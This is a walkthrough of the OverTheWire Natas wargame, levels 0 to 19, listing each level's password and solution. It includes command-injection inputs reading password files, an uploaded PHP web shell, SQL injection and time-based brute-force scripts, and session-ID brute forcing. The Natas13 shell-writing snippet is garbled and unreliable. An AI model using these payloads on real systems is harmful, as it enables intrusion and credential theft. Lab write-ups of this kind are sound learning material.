**[Natas0](http://natas0.natas.labs.overthewire.org)**  
```
username: natas0
password: natas0
```
View source code and got
```
username: natas1
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto 
```
**[Natas01](http://natas1.natas.labs.overthewire.org)**    
View source code and got
```
username: natas2
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 
```

**[Natas02](http://natas2.natas.labs.overthewire.org)**  
View source code  
In line 15, we have tag img src="files/pixel.png"  
Check http://natas2.natas.labs.overthewire.org/files/ we got users.txt
```
username: natas3
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
```

**[Natas03](http://natas3.natas.labs.overthewire.org)**  
View source code  
We got hint
```
No more information leaks!! Not even Google will find it this time...
```
Check http://natas3.natas.labs.overthewire.org/robots.txt, we got /s3cr3t/  
Check http://natas3.natas.labs.overthewire.org/s3cr3t/, we got users.txt
```
username: natas4
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ 
```

**[Natas04](http://natas4.natas.labs.overthewire.org)**  
We have a hint 
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
Press <u>Refresh page</u>, using Burp suite, change Referer to http://natas5.natas.labs.overthewire.org/
```
username: natas5
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
```

**[Natas05](http://natas5.natas.labs.overthewire.org)**   
We have a hint 
```
Access disallowed. You are not logged in
```
Check cookie, change value of cookie <i>loggedin</i> to 1, refresh page and got
```
username: natas6
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 
```

**[Natas06](http://natas6.natas.labs.overthewire.org)**  
We have source code
```php
<?
include "includes/secret.inc";

if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Check http://natas6.natas.labs.overthewire.org/includes/secret.inc, we got
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Input secret and got
```
username: natas7
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```

**[Natas07](http://natas7.natas.labs.overthewire.org)**  
We have a hint
```
password for webuser natas8 is in /etc/natas_webpass/natas8
```
and the url http://natas7.natas.labs.overthewire.org/index.php?page=home  
Check http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 and got
```
username: natas8
password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

**[Natas08](http://natas8.natas.labs.overthewire.org)**  
We have source code
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Try to decode the <i>encodeSecret</i>
```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}

print decodeSecret($encodedSecret)
?>
oubWYf2kBq
```
Input <i>oubWYf2kBq</i> and got
```
username: natas9
password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
```

**[Natas09](http://natas9.natas.labs.overthewire.org)**  
We have source code
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The code <i>passthru("grep -i $key dictionary.txt");</i> get your  input <i>$key</i> and run command line code  
Try to input
```
; cat /etc/natas_webpass/natas10; --
```
We got
```
username: natas10
password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 
```

**[Natas10](http://natas10.natas.labs.overthewire.org)**  
We have source code
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
It's same Natas09 but have a filter <i>[;|&]</i>  
Try to input
```
.* /etc/natas_webpass/natas11
```
We got
```
username: natas11
password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK 
```

**[Natas11](http://natas11.natas.labs.overthewire.org)**  
We have source code
```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```
Cookies are protected with XOR encryption, but let take a look, we can bypass function xor_encrypt because
```
message ^ key = encrypt_message
message ^ encrypt_message = key
```
```php
<?php
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    $encodedSecret = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"; // Cookie

    print base64_decode($encodedSecret) ^ json_encode($defaultdata));
?>
```
We got the key <i>qw8J</i>
```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$fakeData = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); // Change showpassword to yes
print base64_encode(xor_encrypt(json_encode($fakeData)));
?>
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
Change cookie and we got
```
username: natas12
password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 
```

**[Natas12](http://natas12.natas.labs.overthewire.org)**  
We have source code
```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
It doesn't check signature of file, so we try
```php
<?php
    echo shell_exec('cat /etc/natas_webpass/natas13')
?>
```
save natas12.php file, upload file and we got
```
username: natas13
password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 
```

**[Natas13](http://natas13.natas.labs.overthewire.org)**  
We have source code, it's same Natas12 but it check signature of file, so we try
http://natas13.natas.labs.overthewire.org/index.php?a=cat%20/etc/natas_webpass/natas14
```php
shell = open('shell.php','wsshell.write('\xFF\xD8\xFF\xE0'<?php echo shell_exec($_GET["a"]); ?>')
shell.close()
```
save natas13.php file, upload file and we got
```
username: natas14
password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 
```

**[Natas14](http://natas14.natas.labs.overthewire.org)**  
It's simple SQL Injection, input
```sql
" or 1=1; #
```
We got
```
username: natas15
password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 
```

**[Natas15](http://natas15.natas.labs.overthewire.org)**  
In source code, it return exists if execute query return number of rows > 0
```php
if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    }
```
We can brute force password
```python
import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/'
characters = string.ascii_letters + '0123456789'
filter = ''
for char in characters:
    myobj = {'username': 'natas16" and password like binary "%' + char + '%" #'}
    x = requests.post(url, data = myobj, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    if ('exists' in x.text):
        filter = filter + char
print(filter)

password = ''
for i in range(32):
    for char in filter:
        myobj = {'username': 'natas16" and password like binary "' + password + char + '%" #'}
        x = requests.post(url, data = myobj, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if ('exists' in x.text):
            password = password + char
            print(password)
            break
```
```
username: natas16
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 
```

**[Natas16](http://natas16.natas.labs.overthewire.org)**  
It's same Natas15 but have filter
```php
if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    }
```
We can brute force password by using $(command)
```python
import requests
import string

url = 'http://natas16.natas.labs.overthewire.org/'
auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

characters = string.ascii_letters + '0123456789'
filter = ''
for char in characters:
    x = requests.get(url + '?needle=hellos$(grep ' + char + ' /etc/natas_webpass/natas17)&submit=Search', auth=(auth))
    if ('hellos' not in x.text):
        filter = filter + char
print(filter)

password = ''
for i in range(32):
    for char in filter:
        x = requests.get(url + '?needle=hellos$(grep ^' + password + char + ' /etc/natas_webpass/natas17)&submit=Search', auth=(auth))
        if ('hellos' not in x.text):
            password = password + char
            print(password)
            break
```
```
username: natas17
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 
```

**[Natas17](http://natas17.natas.labs.overthewire.org)**  
It's same Natas15 and Natas16 but nothing echo for us,
We can brute force password by using Time-based attack
```python
import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/'
auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

characters = string.ascii_letters + '0123456789'
filter = ''
for char in characters:
    myobj = {'username': 'natas18" and password like binary "%' + char + '%" and sleep(1) #'}
    x = requests.post(url, data = myobj, auth=auth)
    if (x.elapsed.seconds >= 1):
        filter = filter + char
print(filter)

password = ''
for i in range(32):
    for char in filter:
        myobj = {'username': 'natas18" and password like binary "' + password + char + '%" and sleep(1) #'}
        x = requests.post(url, data = myobj, auth=auth)
        if (x.elapsed.seconds >= 1):
            password = password + char
            print(password)
            break
```
```
username: natas18
password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 
```

**[Natas18](http://natas18.natas.labs.overthewire.org)**  
View source code, there are some functions, we will get the flag if the session admin is 1. Let see how we can effect session admin.  
<i>print_credentials</i> function just print information, less care about that.  
<i>isValidAdminLogin</i> function is less care too, because it always returns 0.  
So we check my_session_start function, createID, and isValidID. We see it create a session with id between 0 and 640.
```php
$maxid = 640; // 640 should be enough for everyone
```
So there is some cookie value that make
```php
$_SESSION["admin"] = 1;
```
Brute force it
```python
import requests
import string

url = 'http://natas18.natas.labs.overthewire.org/'
auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
for i in range(640):
    cookies = {'PHPSESSID': str(i)}
    x = requests.post(url, auth=(auth), cookies=cookies)
    print(i)
    if ('You are an admin.' in x.text):
        print(x.text)
        break
```
```
username: natas19
password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 
```

**[Natas19](http://natas19.natas.labs.overthewire.org)**  
The hint says that
```
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
```
Try to login with
```
username: a
password: a
```
We got hex value in session
```
3538332d61
```
Convert it to text
```
583-a
```
Delete cookie, repeat login again, we got
```
120-a
```
Assume that random a number and concat with your username, we try to brute force
```python
import requests
import string

url = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
i = 0;
while True:
    value = str(i) + '-admin';
    cookies = {'PHPSESSID': value.encode('utf-8').hex()}
    x = requests.post(url, auth=(auth), cookies=cookies)
    print(i, value.encode('utf-8').hex())
    i = i + 1;
    if ('You are an admin.' in x.text):
        print(x.text)
        break
```
```
username: natas20
password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 
```

**[Natas20](http://natas20.natas.labs.overthewire.org)**  